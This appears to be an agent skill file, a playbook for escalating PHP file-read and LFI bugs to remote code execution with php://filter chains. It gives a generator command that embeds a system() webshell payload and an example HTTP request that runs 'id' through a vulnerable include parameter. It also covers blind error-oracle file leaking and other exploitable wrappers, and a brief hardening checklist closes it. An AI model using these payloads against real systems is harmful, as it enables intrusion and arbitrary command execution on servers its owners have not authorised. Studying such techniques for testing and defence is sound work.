---
name: php-filter-chains-rce
description: "Turn a PHP file-read / LFI / arbitrary-stream sink into RCE (or a blind error-oracle) using php://filter chains. Use when you control a path passed to include/require/file_get_contents/fopen on a PHP target and need to escalate read -> code execution without uploading a file."
domain: server-side
source: unified-research-2025
---

# php-filter-chains-rce

> Based on Synacktiv's *php_filter_chain_generator* research. A `php://filter` chain lets you prepend arbitrary bytes to the content of a stream by abusing iconv/encoding filters — enough to inject `<?php ... ?>` and get code execution from a pure *read* primitive.

## 1. When to load
You can influence a filename/stream in any of:
- `include` / `include_once` / `require` / `require_once` (classic LFI → best case)
- `file_get_contents`, `fopen`, `readfile`, `file`, `simplexml_load_file`, `getimagesize`, `copy`, phar/zip wrappers
and the app does **not** strictly validate the scheme. If `php://filter/...` is accepted, you likely have a chain.

## 2. Core idea
- `php://filter/convert.iconv.<A>.<B>/resource=...` runs encoding conversions on the stream.
- Chaining many `iconv` conversions can **generate controlled bytes at the start of the output** regardless of the resource content.
- So you can make the stream *begin* with a PHP payload, then feed it to `include` → code runs.

## 3. Exploitation (include sink = RCE)
1. Generate a chain for your payload:
```bash
# https://github.com/synacktiv/php_filter_chain_generator
python3 php_filter_chain_generator.py --chain '<?php system($_GET["c"]); ?>'
# -> php://filter/convert.iconv.UTF8.CSISO2022KR|...|convert.base64-decode/resource=php://temp
```
2. Send it to the vulnerable parameter:
```
GET /index.php?page=php://filter/convert.iconv.UTF8.CSISO2022KR|...|convert.base64-decode/resource=php://temp&c=id HTTP/1.1
```
3. If `page` is `include($_GET['page'])`, your `system($_GET['c'])` executes → `?c=id`.

## 4. Blind / non-include sinks (error oracle)
Even when the sink only *reads* (no include) and shows no output, filter chains are a **blind oracle**:
- A chain that forces a huge expansion triggers an out-of-memory / processing error → observable 500 or timing.
- Combine with `web-timing-attacks` to read data bit-by-bit, or to confirm the wrapper is reachable.
- Tools: `wrapwrap` (Synacktiv) to prepend arbitrary content before a file you want to leak (e.g. exfil a file that doesn't start with a known marker).

## 5. Related wrappers worth trying
| Wrapper | Use |
|---|---|
| `data://text/plain;base64,...` | Direct payload if `allow_url_include=On` |
| `expect://id` | RCE if `expect` extension loaded |
| `phar://` | Deserialization gadget via crafted phar metadata |
| `zip://` / `php://filter` + upload | Chain with a benign file upload |

## 6. Hardening checks (for the report / fix)
- Reject `php://`, `data://`, `phar://`, `zip://`, `expect://` schemes; allowlist exact filenames.
- `allow_url_include=Off`, `allow_url_fopen=Off`.
- Never pass user input to `include`/`require`; map to an internal enum.

## 7. Related skills
`path-traversal`, `deserialization-insecure`, `ssrf`, `web-timing-attacks`.
